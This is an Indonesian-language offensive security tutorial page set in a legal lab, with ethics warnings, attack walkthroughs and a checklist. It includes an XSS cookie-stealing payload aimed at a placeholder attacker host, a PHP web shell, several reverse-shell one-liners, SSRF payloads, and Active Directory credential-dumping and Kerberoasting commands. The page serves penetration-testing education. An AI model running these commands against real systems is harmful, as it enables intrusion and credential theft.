Offensive Security — Cara Serang yang Benar

Cara berpikir dan bekerja seperti penyerang, tetapi untuk tujuan yang sah: menguji dan memperkuat. Kuasai alur serangan lengkap — dari identifikasi target sampai laporan — sesuai standar profesional.

Etika & Legalitas adalah Keharusan

Seluruh teknik di halaman ini hanya untuk uji keamanan yang sah: lab sendiri, sistem dengan izin tertulis, atau platform CTF resmi. Akses tanpa izin adalah tindak pidana — di Indonesia diatur oleh UU ITE (No. 11/2008 jo. No. 19/2016) dan UU PDP. Tiga kata kunci: scope, izin tertulis, dan tanggung jawab.

02 — alur serangan

Kill Chain: Empat Fase Inti Penetrasi

Setiap fase punya tujuan, tools, dan output. Berlatih secara berurutan membentuk otot metodologis yang kamu perlukan di engagement nyata.

1

Reconnaissance

Kumpulkan informasi. Pasif (tanpa menyentuh target): OSINT, search engine, Shodan, metadata dokumen. Aktif: ping sweep, DNS lookup. Tujuan: memperkecil permukaan serangan.

2

Scanning & Enumeration

Petakan port terbuka, service, versi, dan konten. Prinsip emas: enumeration is everything. Semakin lengkap peta, semakin tepat eksploitasi.

3

Exploitation & Post-Exploitation

Tembus sistem lewat celah terverifikasi, lalu menilai nilai akses: privilege escalation, persistence (sesuai izin), dan lateral movement. Setiap aksi harus terukur dan terdokumentasi.

4

Covering Tracks & Reporting

Bersihkan artifact sesuai Rule of Engagement, lalu susun laporan: temuan, bukti, severity, dan rekomendasi. Laporan adalah produk terpenting seorang pentester.

"Kill chain bukan cuma milik penyerang — di modul Defensive kamu akan melihat cara memetakan fase-fase ini ke titik deteksi. Penyerang yang baik memahami pertahanan, dan sebaliknya."
03 — studi kasus

Walkthrough Lengkap: SQL Injection

Simulasi nyata menguji aplikasi web rentan pada lab legal (DVWA / OWASP Juice Shop). Perhatikan setiap langkah punya tujuan yang jelas dan terdokumentasi.

Langkah 1 — Reconnaissance & Enumerasi

step-1 :: recon.py
$ nmap -sV -p 80,443 10.10.10.10
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -u http://10.10.10.10/FUZZ
/index.php    [200]
/config/      [301]
/search.php   [200]  <- parameter dinamis terindikasi

Langkah 2 — Deteksi Manual via Burp Repeater

step-2 :: manual-burp
# 1) Masukkan karakter kutip — amati error
GET /search.php?q=' HTTP/1.1        [500] SQL syntax error
# 2) Inject kondisi selalu benar — amati hasil
GET /search.php?q=' OR '1'='1 HTTP/1.1  [200] semua baris tampil
# 3) Konfirmasi jumlah kolom (ORDER BY)
GET /search.php?q=' ORDER BY 4-- HTTP/1.1  [200] → 5 kolom [500]

Langkah 3 — Otomasi Terukur dengan SQLMap

step-3 :: sqlmap-automation
$ sqlmap -u 'http://10.10.10.10/search.php?q=test' --dbs --batch
[+][+] retrieved: dvwa, information_schema
$ sqlmap -u 'http://10.10.10.10/search.php?q=test' -D dvwa --tables --batch
accounts, session, users
$ sqlmap -u 'http://10.10.10.10/search.php?q=test' -D dvwa -T users --dump --batch
[!] kredensial ditemukan — cukup buktikan dampak, JANGAN eksfiltrasi di luar scope
Best Practice Profesional

Di pentest nyata, setelah membuktikan limitasi akses (misal berhasil membaca struktur database), berhenti dan dokumentasikan. Tujuannya membuktikan risiko, bukan mengambil/menghancurkan data. Selalu taati ruang lingkup kontrak.

Coba Sendiri — Sandbox SQLMap

Ketik perintah persis seperti di atas pada terminal interaktif: sqlmap -u "http://target/search?id=1" --dbs --batch, lalu dump tabel, atau sqlmap --help.

04 — serangan web

Serangan Web Lain yang Wajib Kamu Kuasai

Setiap kategori punya mekanisme, dampak, dan jalan pulihnya sendiri. Pelajari semuanya lewat tab di bawah.

Cross-Site Scripting (XSS)

Menyisipkan skrip ke halaman yang dilihat korban. Tiga varian: Reflected (payload di URL), Stored (payload tersimpan di server), dan DOM-based (terjadi murni di sisi client).

xss-payload
<script>fetch('http://attacker/log?c='+document.cookie)</script>

Uji nyata: intercept value di Burp → inject payload → amati callback di server. Di lingkungan modern cek juga CSP bypass karena banyak aplikasi kini memakai Content-Security-Policy.

Cross-Site Request Forgery (CSRF)

Memanipulasi browser korban yang sudah terautentikasi agar menjalankan aksi tanpa sepengetahuannya — transfer dana, ganti password, atau aksi sensitif lain.

csrf-demo
<img src="http://bank/transfer?to=xxx&amount=1000">
<form action="http://bank/transfer" method="POST"></form>

Deteksi: cek kehadiran token anti-CSRF, atribut SameSite pada cookie, dan validasi Origin/Referer.

Server-Side Request Forgery (SSRF)

Menipu server agar membuat request ke resource internal — cloud metadata, service internal, ataupun memindai jaringan pribadi. Sering ditemukan di fitur "fetch image" / "import URL".

ssrf-payloads
url=http://169.254.169.254/latest/meta-data/   # AWS EC2 IMDS
url=http://localhost:9200/_cat/indices        # Elasticsearch internal
url=file:///etc/passwd                       # jika protocol tidak dibatasi

Insecure Direct Object Reference (IDOR)

Mengganti ID objek di parameter/URL untuk mengakses data milik user lain. Serangan paling sederhana tapi paling sering ditemukan di API.

idor-demo
$ GET /api/users/1001/profile   200 OK (profil user lain)
$ GET /download?file=invoice_001.pdf  200 OK

Best practice: gunakan object-level authorization server-side, bukan sekadar menyembunyikan ID di frontend.

RCE via Upload & Deserialization

Malicious file upload: web shell dengan ekstensi/type yang tidak tervalidasi. Insecure deserialization: objek yang dimanipulasi saat aplikasi mendeserialize data (YAML, pickle, Java/PHP object).

webshell-demo
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
$ curl http://target/uploads/shell.php?cmd=id
uid=33(www-data) gid=33(www-data)
05 — akses

Reverse Shell: Konsep yang Wajib Dipahami

Reverse shell adalah fondasi exploitation modern. Target terhubung kembali ke penyerang — mengatasi NAT dan firewall ingress.

Kenapa Reverse, Bukan Bind?

Bind shell berjalan di target dan menunggu koneksi di port tertentu — mudah diblokir firewall egress. Reverse shell membuat target menginisiasi koneksi keluar menuju listener penyerang, yang umumnya diizinkan.

attacker :: listener
$ nc -lvnp 4444
listening on [any] 4444 ...
target :: payload choices
# payload yang dikirim (contoh)
bash -i >& /dev/tcp/10.0.0.2/4444 0>&1
$ nc -e /bin/sh 10.0.0.2 4444
$ python3 -c 'import socket,os,pty; s=socket.socket(); s.connect(("10.0.0.2",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'
Kompetensi

Kamu pasti akan melihat payload Bash/Python/netcat. Pahami cara kerja masing-masing (stdio, descriptors, pty) sebelum menjalankannya. Dan tetap hanya di lab.

06 — windows

Hacking Windows & Active Directory

Target paling umum di dunia korporat. Alur modern berfokus pada Kerberos, SMB, dan dari sana membaca peta relasi AD dengan BloodHound.

ad-attack-path.sh
1. nmap -p139,445,3389,389 dc.corp.local
2. crackmapexec smb 10.0.0.0/24 --user-file users.txt --pass-file pass.txt
[+] 10.0.0.15  VALID  admin / Winter2026!
3. bloodhound-python -d corp.local -u admin -p 'Winter2026!' -c All
4. impacket-secretsdump corp.local/admin:'Winter2026!'@10.0.0.15
[!] NTDS.dit ter-dump — seluruh hash kredensial domain terekspos
5. impacket-GetUserSPNs corp.local/admin:'Winter2026!' -request  # Kerberoast
6. hashcat -m 13100 kerberoast.txt rockyou.txt --show    # crack tiket

Kerberoasting

Meminta TGS ticket untuk service yang berjalan sebagai akun user, lalu cracking offline. Steel — tidak menghasilkan alarm tinggi karena memakai protokol normal.

Pass-the-Hash

Memakai NTLM hash tanpa perlu plaintext untuk autentikasi ke SMB/RDP. Menunjukkan mengapa mencegah cred-harvest lebih penting daripada sekadar password.

Golden / Silver Ticket

Memalsukan Kerberos Ticket Granting Tickets dengan hash KRBTGT. Persistence paling berbahaya di domain — hanya bisa dibersihkan dengan reset password KRBTGT dua kali.

DCSync

Menyamar sebagai Domain Controller untuk mereplikasi kredensial via lsadump::dcsync. Butuh hak tinggi, dampak total.

08 — jaringan

MITM & Serangan Jaringan Lokal

Sebatasi pada lab. Memahami teknik ini justru membuatmu lebih pandai membelanya.

bettercap :: ARP spoof
sudo bettercap -iface wlan0
[bettercap] net.probe on
[bettercap] set arp.spoof.targets 10.0.0.5
[bettercap] arp.spoof on
[bettercap] net.sniff on

Apa yang Terjadi?

Di sebuah segmen jaringan, penyerang memposisikan diri seolah-olah sebagai gateway. Traffic korban mengalir melalui penyerang — kredensial HTTP plaintext dapat tertangkap. Ini yang membuat HTTPS + HSTS dan 802.1X port security menjadi krusial.

Deteksi yang Harus Kamu Tahu

MAC ganda di tabel ARP, latensi naik, sertifikat tidak valid saat membuka HTTPS, dan lonjakan ICMP. Mengenal tanda-tanda ini membuatmu bisa membela dengan lebih tajam.

09 — bergerak

Pivoting & Lateral Movement

Setelah menguasai satu host, lanjut ke internal. Pivoting = menggunakan host yang didapat sebagai jembatan ke segmen lain.

metasploit :: route pivot
meterpreter > run autoroute -s 172.16.5.0/24
meterpreter > background
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set rhosts 172.16.5.10
msf6 > set session 1   # lewat sesi sebagai jembatan
proxychains :: socks tunnel
$ proxychains nmap -sT -Pn 172.16.5.10
# semua tools jalan lewat proxy SOCKS
$ proxychains hydra -l admin -P pass.txt ssh://172.16.5.10
Pivoting menguji kedewasaanmu: terus berapa jauh kamu bergerak dalam scope yang disepakati. Pergerakan di luar scope adalah pelanggaran kontrak serius.

11 — lab serangan

Lab Serangan: 10 Langkah Estafet Penetrasi

Jalur serangan utuh dari otorisasi sampai laporan, langkah demi langkah di terminal sandbox. Klik Jalankan pada tiap noktah dan ikuti alurnya berurutan — tiap langkah mewarisi hasil langkah sebelumnya, persis engagement sungguhan. Semua legal: target adalah host lab di roa.txt.

1. Rules of Engagement — Legalitas Dulu, Baru Menyerang

Sebelum menyentuh target, seorang profesional membaca kontraknya: siapa pemilik aset, target mana yang masuk scope, dan apa yang dilarang. Di sandbox, lab/roa.txt memegang peran itu — catat bahwa kali-recon (192.168.1.30) dilarang disentuh. Tanpa otorisasi tertulis, insiden di atas hanyalah pelanggaran hukum.

cat lab/roa.txt

2. Reconnaissance — Kenali Medan Terlebih Dahulu

Recon pasif dulu: cat lab/targets.txt memberi peta host latihan (mana target web, AD, dan DMZ). Lalu aktif: ping memastikan host hidup sebelum berlanjut. Perhatikan kalau kali-recon menolak ping — itu dirancang mengingatkanmu agar tidak menyapu host di luar scope.

cd /home/student/lab && cat targets.txt && ping 192.168.1.10

3. Scanning — Petakan Layanan & Versi

Prinsip emas pentest: enumeration is everything. nmap -sV mengungkap port terbuka berikut versi layanannya — versi adalah kunci menuju exploit yang cocok (nanti dipasangkan lewat searchsploit). Scan kedua menyasar host AD win-srv-01: SMB (445) dan RDP (3389) adalah dua sasaran paling umum di lingkungan korporat.

nmap -sV 192.168.1.10
nmap -p 135,139,445,3389,5985 192.168.1.20

4. Enumerasi Web — Buka Permukaannya

Web app adalah pintu masuk paling umum. gobuster memetakan direktori tersembunyi; nikto menebar masalah konfigurasi (directory listing terbuka, security headers hilang). Hasil cisplang ini menentukan langkah berikut: parameter ?id= pada search tampak dinamis — kandidat ideal uji injeksi.

gobuster dir -u http://lab-web-01 -w /opt/lab/wordlists/directory.txt
nikto -h http://lab-web-01

5. Exploit — Buktikan SQL Injection

Parameter id digabung mentah ke query SQL (lihat /opt/lab/index.php). sqlmap menguji otomatis: mendata database (--dbs), lalu mengekstrak sampel (--dump) yang berisi hash kredensial user admin dan webadmin. Ingat batas profesional: cukup membuktikan dampak, bukan membawa seluruh data — sampel ini sudah menjadi bukti temuan.

sqlmap -u 'http://lab-web-01/search?id=1' --dbs --batch
sqlmap -u 'http://lab-web-01/search?id=1' --dump

6. Cracking & Klaim Flag Pertama

Simpan output dump sebagai evidence (> lab/sqli-dump.txt), lalu john menyelesaikan hash MD5 di dalamnya — webadmin ternyata memakai kata sandi chicken. Sekaligus uji john lab/hashes.txt untuk bukti hash lain. Misi web tuntas: baca flag lalu klaim dengan flag FLAG{lab-web-01}.

cat lab/hashes.txt && john lab/hashes.txt
sqlmap -u 'http://lab-web-01/search?id=1' --dump > lab/sqli-dump.txt && john lab/sqli-dump.txt
cat lab/flag-web.txt && flag FLAG{lab-web-01} && score

7. SSH & Post-Exploitation — Masuk dengan Kredensial Hasil Crack

Kredensial chicken hasil cracking kita pakai untuk masuk: ssh webadmin@lab-web-01. Di dalam, kumpulan nilaian akses: id (uid 1001), cat ~/.backup.config (sebuah bocoran kata sandi database — sumber masalah kredensial yang dikelola buruk), dan sudo -l yang menampilkan hak spesial: NOPASSWD: /opt/backup.sh. Itu halaman menu menuju privesc.

ssh webadmin@lab-web-01
id && cat /home/webadmin/.backup.config
sudo -l

8. Privilege Escalation — Dari webadmin ke Root

Enumerasi dulu: linpeas menyoroti dua temuan — /opt/backup.sh world-writable dan dijalankan cron sebagai root; konfirmasikan lewat cat /etc/crontab. Dengan hak sudo NOPASSWD kamu langsung bisa eksekusi: sudo /opt/backup.sh. Begitu id menunjukkan uid=0(root), baca /root/root.txt yang hanya terbaca root, lalu klaim FLAG{pwn-root}. Rujuk GTFOBins untuk teknik tambahan seperti find -exec.

linpeas
cat /etc/crontab
sudo /opt/backup.sh
id && whoami && cat /root/root.txt
flag FLAG{pwn-root} && score

9. Pivoting — Jembatan ke Segmen DMZ

Host yang kamu kuasai menjadi batu loncatan. Dari posisi ini petakan DMZ korporat 10.0.5.7: nmap -sV memperlihatkan ftp (vsftpd 3.0.3) yang terpapar. Uji kredensial lemah standar dengan hydra — guest:guest123 ternyata valid. Baca lab/flag-internal.txt dan klaim FLAG{dmz-internal}. Disiplin tetap berlaku: gerakan lateral di luar scope kontrak adalah pelanggaran serius.

nmap -sV 10.0.5.7
hydra -l guest -P /opt/lab/wordlists/passwords.txt ftp://10.0.5.7
cat lab/flag-internal.txt && flag FLAG{dmz-internal} && score

10. Bukti & Laporan — Produk Terpenting Pentester

Engagement ditutup dengan catatan yang dapat dipertanggungjawabkan: rekam isi bukti temuan (lab/evidence-sqli.txt), jaga integritasnya dengan sha256sum sebagai sidik jari bukti, lalu rekap via score. Lihat lab/ir-report-template.md sebagai kerangka laporan final yang memuat temuan, severity, dan rekomendasi perbaikan yang dapat diuji.

ls -la lab && cat lab/evidence-sqli.txt
sha256sum lab/flag-web.txt && sha256sum lab/flag-internal.txt
score && missions
Disiplin Scope

Kesepuluh langkah sah karena berjalan di host yang terdaftar di roa.txt. Di engagement nyata kamu menghentikan pengujian begitu dampak terbukti, mendokumentasikan temuan, dan tidak pernah bergerak melewati batas kontrak.

12 — studi kasus penuh

Contoh Penuh: Satu Engagement di Tujuh Lapis OSI

Step-by-step super lengkap dalam satu skenario utuh: pentest terhadap lab-web-01 (192.168.1.10) mulai dari otorisasi sampai bukti kemenangan, dari awal sampai akhir, ditelusuri naik mengikuti model OSI — legalitas → bit di kabel (physical) → MAC & frame (data link) → IP & rute (network) → port & handshake (transport) → sesi SSH (session) → cracking hash & encoding (presentation) → SQLi aplikasi (application) → privesc root → klaim flag. Seluruh perjalanannya tertulis utuh di transkrip penuh di bawah — output asli sandbox, bukan sekadar cerita — dan kamu boleh menjalankan ulang tiap langkah lewat tombol Jalankan pada tiap lapis.

transkrip-penuh — engagement #07 · lab-web-01 (awal→akhir)

# ===== AKHIR — bukti kemenangan tercatat, engagement selesai =====

Lapis 1 · Physical — Bit di Kabel

Semua lalu lintas dimulai sebagai sinyal listrik di kabel tembaga. Lapisan physical mengurus sinyal, konektor, dan byte rate — ia tidak tahu soal IP maupun port, tetapi di sinilah setiap serangan dan setiap forensik benar-benar terjadi. Tujuan penyerang: memastikan host merespons di lapisan terendah. tcpdump menangkap paket mentah untuk membuktikan percakapan jaringan sungguhan mengalir lewat kartu eth0.

tcpdump -i eth0 -c 4

Lapis 2 · Data Link — MAC & Frame

Frame Ethernet membawa alamat MAC — identitas kartu jaringan milik kita dan target. MAC kamu 00:0c:29:3a:2b:1e (kartu virtual VMware), dan nmap -sn mengungkap MAC host target hingga bukan milik kita. Serangan seperti ARP spoofing / man-in-the-middle bekerja persis di lapis ini; begitu pula sniffing pasif ala Wireshark/bettercap.

ip a
nmap -sn 192.168.1.10

Lapis 3 · Network — IP, Routing, Reachability

Lapisan network menghubungkan host lewat IP, subnet, dan rute: jaringan 192.168.1.0/24 dengan gateway 192.168.1.1, ditambah host rekan yang terdaftar di /etc/hosts. Di lapis ini penyerang membangun peta: ip route menunjukkan jalur keluar, dan ping (ICMP) memastikan lab-web-01 hidup sebelum engagemen berlanjut.

ip route && cat /etc/hosts && ping 192.168.1.10

Lapis 4 · Transport — Port & Handshake TCP

Lapisan transport adalah pintu: TCP/UDP + nomor port, lengkap dengan handshake tiga langkah dan retransmisi. Port tertutup berarti pintu terkunci; port terbuka berarti pintu masuk. nmap -sV menemukan port 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL), 6379 (Redis) berikut versi layanannya — amunisi untuk langkah berikutnya.

nmap -sV 192.168.1.10

Lapis 5 · Session — Menjalin Sesi SSH

Lapisan session mengatur kapan percakapan dibuka, dipertahankan, dan ditutup — SSH adalah contoh sempurna: ia juga mengenkripsi, tetapi yang menonjol adalah autentikasi dan state sesi. Penyerang menjalin sesi sebagai webadmin (kredensial hasil cracking), lalu menggunakan skrip /opt/backup.sh yang salah izin untuk menaikkan sesi yang sama menjadi root.

ssh webadmin@lab-web-01
id && sudo /opt/backup.sh && whoami

Lapis 6 · Presentation — Hash, Encoding, Enkripsi

Lapisan presentation mengatur bentuk data: encoding, hashing, enkripsi, kompresi. Kredensial tidak pernah disimpan apa adanya — webadmin:chicken tersimpan sebagai hash MD5 yang kita pecahkan dengan John. Payload pun dikodekan base64 agar lolos pemfilteran. Menangani "representasi data" adalah pekerjaan penuh di tiap engagement.

john lab/hashes.txt
base64 chicken && base64 -d Y2hpY2tlbg==

Lapis 7 · Application — SQLi Meruntuhkan Web

Puncak rantai: semua lapisan di bawah bekerja agar serangan berhasil sampai di aplikasi web. Injeksi pada parameter id dieksploitasi penuh oleh sqlmap — seluruh database runtuh. Di lapis ini bukti kemenangan diambil, flag diklaim, dan misi direkap. Pentesting web bukan hanya soal payload: ia berdiri di atas tujuh lapis sekaligus.

sqlmap -u 'http://lab-web-01/search?id=1' --dump
cat lab/flag-web.txt && flag FLAG{lab-web-01} && score
Satu Rantai, Tujuh Lapis

Engagement ini merentang dari bit di kabel (physical) sampai SQLi di aplikasi web (application): pemetaan MAC dan network, scanning transport, sesi SSH, cracking hash, hingga encoding payload. Tiap lapis menyumbang satu mata rantai. Kekuatan blue team justru kebalikannya — mereka menutup lubang di setiap lapis, dari firewall hingga validasi input, sehingga tidak ada satu lapis pun yang bisa dimanfaatkan.

Checklist Offensive Workflow

Pre-Engagement

  1. Scope & izin tertulis ditandatangani
  2. Ruang lingkup target eksplisit (IP/domain)
  3. Aturan engagement: jam uji, tools terlarang
  4. Kontak darurat (incident) tersedia
  5. Backup / snapshot target disiapkan

During

  1. Recon pasif sebelum aktif
  2. Enumeration menyeluruh (semua service)
  3. Uji manual + verifikasi false positive
  4. Exploitation terukur & terdokumentasi
  5. Post-exploit seminimal mungkin untuk bukti dampak

Post

  1. Bersihkan implant & artifact
  2. Tulis laporan: temuan + bukti (screenshot)
  3. Severity dengan CVSS & EPSS
  4. Rekomendasi remediasi yang testable
  5. De-brief dengan tim IT & jadwalkan retest
